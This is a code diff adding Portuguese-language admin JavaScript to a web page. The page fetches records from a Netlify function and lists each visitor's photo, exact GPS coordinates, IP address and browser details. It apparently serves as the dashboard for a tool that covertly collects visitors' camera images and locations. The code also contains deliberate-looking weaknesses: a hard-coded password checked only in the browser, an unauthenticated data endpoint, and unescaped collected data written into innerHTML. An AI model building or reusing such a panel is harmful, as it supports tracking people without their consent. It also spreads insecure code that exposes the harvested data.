@@ -483,4 +483,263 @@
     </div>
 
     <!-- ============================================================
-    JAVASCRIPT -
+    JAVASCRIPT - ADMIN
+    ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // CONFIGURAÇÕES
+            // ============================================================
+            const SENHA_ADMIN = 'imaginacao2026'; // ← MUDE A SENHA AQUI!
+            const ADMIN_URL = '/.netlify/functions/admin';
+
+            // ============================================================
+            // DOM
+            // ============================================================
+            const loginOverlay = document.getElementById('loginOverlay');
+            const senhaInput = document.getElementById('senhaInput');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginError = document.getElementById('loginError');
+            const mainContent = document.getElementById('mainContent');
+            const logoutBtn = document.getElementById('logoutBtn');
+            const coletasList = document.getElementById('coletasList');
+            const totalColetas = document.getElementById('totalColetas');
+            const statTotal = document.getElementById('statTotal');
+            const statComFoto = document.getElementById('statComFoto');
+            const statComLocal = document.getElementById('statComLocal');
+            const statHoje = document.getElementById('statHoje');
+            const countLabel = document.getElementById('countLabel');
+
+            // ============================================================
+            // FUNÇÕES DE AUTENTICAÇÃO
+            // ============================================================
+            function fazerLogin() {
+                const senha = senhaInput.value.trim();
+                if (senha === SENHA_ADMIN) {
+                    loginOverlay.classList.add('hidden');
+                    mainContent.style.display = 'block';
+                    loginError.classList.remove('visible');
+                    carregarDados();
+                } else {
+                    loginError.classList.add('visible');
+                    senhaInput.value = '';
+                    senhaInput.focus();
+                }
+            }
+
+            function fazerLogout() {
+                mainContent.style.display = 'none';
+                loginOverlay.classList.remove('hidden');
+                senhaInput.value = '';
+                loginError.classList.remove('visible');
+                senhaInput.focus();
+            }
+
+            // ============================================================
+            // CARREGAR DADOS DA API
+            // ============================================================
+            async function carregarDados() {
+                coletasList.innerHTML = '<div class="loading-state">⏳ Carregando dados...</div>';
+
+                try {
+                    const response = await fetch(ADMIN_URL);
+                    if (!response.ok) throw new Error('Erro ao carregar dados');
+                    const data = await response.json();
+
+                    if (data.total === 0) {
+                        coletasList.innerHTML = `
+                            <div class="empty-state">
+                                <div class="icon">🌿</div>
+                                <div>Nenhuma coleta registrada ainda.</div>
+                                <div style="font-size:12px;margin-top:4px;">As primeiras folhas estão começando a cair...</div>
+                            </div>
+                        `;
+                        countLabel.textContent = '0 coletas';
+                        return;
+                    }
+
+                    renderizarColetas(data.arquivos);
+                    atualizarStats(data.arquivos);
+
+                } catch (error) {
+                    console.error('Erro ao carregar:', error);
+                    coletasList.innerHTML = `
+                        <div class="empty-state">
+                            <div class="icon">⚠️</div>
+                            <div>Erro ao carregar dados.</div>
+                            <div style="font-size:12px;margin-top:4px;">Tente novamente mais tarde.</div>
+                        </div>
+                    `;
+                }
+            }
+
+            // ============================================================
+            // RENDERIZAR COLETAS
+            // ============================================================
+            function renderizarColetas(arquivos) {
+                countLabel.textContent = arquivos.length + ' coletas';
+
+                let html = '';
+                arquivos.forEach((item, index) => {
+                    const dados = item.conteudo || {};
+                    const local = dados.localizacao || {};
+                    const navegador = dados.navegador || {};
+                    const temFoto = !!dados.foto;
+                    const temLocal = !!(local.latitude && local.longitude);
+
+                    const lat = local.latitude ? local.latitude.toFixed(6) : '—';
+                    const lon = local.longitude ? local.longitude.toFixed(6) : '—';
+
+                    html += `
+                        <div class="coleta-item" data-index="${index}">
+                            <div class="row">
+                                <div class="left">
+                                    <span class="id">#${dados.id ? dados.id.substring(0,8) : '—'}</span>
+                                    <span class="timestamp">${formatarData(dados.timestamp)}</span>
+                                    ${temFoto ? '<span class="has-foto">📸 Foto</span>' : '<span class="no-foto">📸 Sem foto</span>'}
+                                    ${temLocal ? `<span class="localizacao">📍 ${lat}, ${lon}</span>` : ''}
+                                </div>
+                                <div>
+                                    <button class="toggle-details" data-index="${index}">▾ Detalhes</button>
+                                </div>
+                            </div>
+                            <div class="details" id="details-${index}">
+                                <div class="detail-row">
+                                    <span class="label">ID completo</span>
+                                    <span class="value">${dados.id || '—'}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="label">Data/Hora</span>
+                                    <span class="value">${formatarDataCompleta(dados.timestamp)}</span>
+                                </div>
+                                ${local.latitude ? `
+                                <div class="detail-row">
+                                    <span class="label">Latitude</span>
+                                    <span class="value">${local.latitude}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="label">Longitude</span>
+                                    <span class="value">${local.longitude}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="label">Precisão</span>
+                                    <span class="value">${local.precisao ? local.precisao + 'm' : '—'}</span>
+                                </div>
+                                ` : ''}
+                                <div class="detail-row">
+                                    <span class="label">Navegador</span>
+                                    <span class="value">${navegador.userAgent ? navegador.userAgent.substring(0,60) + '...' : '—'}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="label">Timezone</span>
+                                    <span class="value">${navegador.timezone || '—'}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="label">Idioma</span>
+                                    <span class="value">${navegador.language || '—'}</span>
+                                </div>
+                                ${dados.ip ? `
+                                <div class="detail-row">
+                                    <span class="label">IP</span>
+                                    <span class="value">${dados.ip}</span>
+                                </div>
+                                ` : ''}
+                                ${dados.foto ? `
+                                <div class="detail-row">
+                                    <span class="label">Foto (Base64)</span>
+                                    <span class="value" style="font-size:10px;max-width:70%;">${dados.foto.substring(0,60)}...</span>
+                                </div>
+                                ` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+
+                coletasList.innerHTML = html;
+
+                // Event listeners para toggle de detalhes
+                document.querySelectorAll('.toggle-details').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const idx = this.dataset.index;
+                        const details = document.getElementById('details-' + idx);
+                        details.classList.toggle('visible');
+                        this.textContent = details.classList.contains('visible') ? '▴ Ocultar' : '▾ Detalhes';
+                    });
+                });
+            }
+
+            // ============================================================
+            // ATUALIZAR STATS
+            // ============================================================
+            function atualizarStats(arquivos) {
+                const total = arquivos.length;
+                let comFoto = 0, comLocal = 0, hoje = 0;
+                const hojeStr = new Date().toISOString().split('T')[0];
+
+                arquivos.forEach(item => {
+                    const dados = item.conteudo || {};
+                    if (dados.foto) comFoto++;
+                    if (dados.localizacao && dados.localizacao.latitude) comLocal++;
+
+                    if (dados.timestamp && dados.timestamp.startsWith(hojeStr)) {
+                        hoje++;
+                    }
+                });
+
+                statTotal.textContent = total;
+                statComFoto.textContent = comFoto;
+                statComLocal.textContent = comLocal;
+                statHoje.textContent = hoje;
+                totalColetas.textContent = total + ' coletas';
+            }
+
+            // ============================================================
+            // FORMATADORES
+            // ============================================================
+            function formatarData(timestamp) {
+                if (!timestamp) return '—';
+                const d = new Date(timestamp);
+                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
+            }
+
+            function formatarDataCompleta(timestamp) {
+                if (!timestamp) return '—';
+                const d = new Date(timestamp);
+                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit',
+                    minute: '2-digit', second: '2-digit' });
+            }
+
+            // ============================================================
+            // EVENTOS
+            // ============================================================
+            loginBtn.addEventListener('click', fazerLogin);
+            senhaInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') fazerLogin();
+            });
+            logoutBtn.addEventListener('click', fazerLogout);
+
+            // Foca no input de senha ao carregar
+            setTimeout(() => senhaInput.focus(), 300);
+
+            // ============================================================
+            // RECARREGAR AUTOMÁTICO A CADA 30s
+            // ============================================================
+            if (mainContent.style.display !== 'none') {
+                setInterval(carregarDados, 30000);
+            }
+
+            // Se já estiver logado (recarregar página), mantém
+            // O login é controlado pela overlay
+
+            // ============================================================
+            // EXPÕE PARA DEBUG
+            // ============================================================
+            window.__admin = { carregarDados, fazerLogin, fazerLogout };
+
+        })();
+    </script>
+
+</body>
+</html>
